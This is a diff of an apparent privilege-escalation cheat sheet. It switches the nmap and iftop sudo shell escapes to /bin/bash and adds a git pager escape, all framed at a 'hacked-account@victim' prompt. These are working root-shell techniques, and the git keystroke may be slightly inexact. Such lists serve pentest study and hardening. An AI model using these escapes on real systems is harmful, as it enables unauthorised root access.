@@ -206,11 +206,16 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 
 <h2>nmap</h2>
 
-<b>hacked-account@victim~: </b><code>sudo nmap --interactive</code> followed by <code>!sh</code>
+<b>hacked-account@victim~: </b><code>sudo nmap --interactive</code> followed by <code>!bash</code>
+
+<h2>git</h2>
+
+<b>hacked-account@victim:~: </b><code> sudo git -p help config</code> followed by <b>shift+:</b> and Command> <code>/bin/bash</code>
+
 
 <h2>iftop</h2>
 
-<b>hacked-account@victim:~: </b><code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>
+<b>hacked-account@victim:~: </b><code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/bash</code>
 
 <h2>find</h2>
 
